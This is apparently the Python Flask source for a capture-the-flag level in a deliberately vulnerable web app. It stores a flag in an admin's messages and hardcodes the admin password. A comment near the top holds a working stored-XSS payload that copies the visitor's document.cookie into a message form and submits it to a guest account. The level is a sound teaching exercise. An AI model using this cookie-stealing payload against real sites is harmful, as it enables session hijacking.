from chew_toy_web import app
from flask import render_template, request, session, redirect
import os
import sqlite3

# Hai!<script>document.forms[1].getElementsByTagName('input')[1].value = document.cookie;document.forms[1].getElementsByTagName('input')[0].value = 'guest';document.forms[1].submit();</script>

# Needs the admin account to log in and then periodically check the messages page ...
# PhantomJS?

def get_db():
    creating = not os.path.isfile('level5.db')
    conn = sqlite3.connect('level5.db')
    if creating:
        c = conn.cursor()
        c.execute('CREATE TABLE users (username TEXT, password TEXT, admin INTEGER)')
        c.execute("INSERT INTO users VALUES ('admin', 'j6GM0bbCP8q9NQ1PotbZ1', 1)")
        c.execute("INSERT INTO users VALUES ('guest', '', 0)")
        c.execute('CREATE TABLE messages (id INTEGER PRIMARY KEY AUTOINCREMENT, "from" TEXT, "to" TEXT, message TEXT)')
        c.execute("INSERT INTO messages ('from', 'to', message) VALUES ('admin', 'admin', 'The flag is FLAG_FOR_LEVEL_5')")
        conn.commit()
    return conn

@app.route('/level5', methods=['GET'])
def level5_get():
    conn = get_db()
    c = conn.cursor()
    result = []
    username = session['username'] if 'username' in session else 'guest'
    for row in c.execute('SELECT * FROM messages WHERE "to" = ?', (username,)):
        result.append({ 'from': row[1], 'message': row[3] })
    return render_template('level5.html', result=result)

@app.route('/level5', methods=['POST'])
def level5_post():
    username = session['username'] if 'username' in session else 'guest'
    to = request.form['to']
    message = request.form['message']

    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO messages ('from', 'to', message) VALUES (?, ?, ?)", (username, to, message,))
    conn.commit()
    return redirect('/level5')

@app.route('/level5/login', methods=['POST'])
def level5_login():
    username = request.form['username']
    password = request.form['password']

    conn = get_db();
    c = conn.cursor()
    c.execute('SELECT password FROM users WHERE username = ?', (username,))
    if password == c.fetchone()[0]:
        session['username'] = username
    return redirect('/level5')

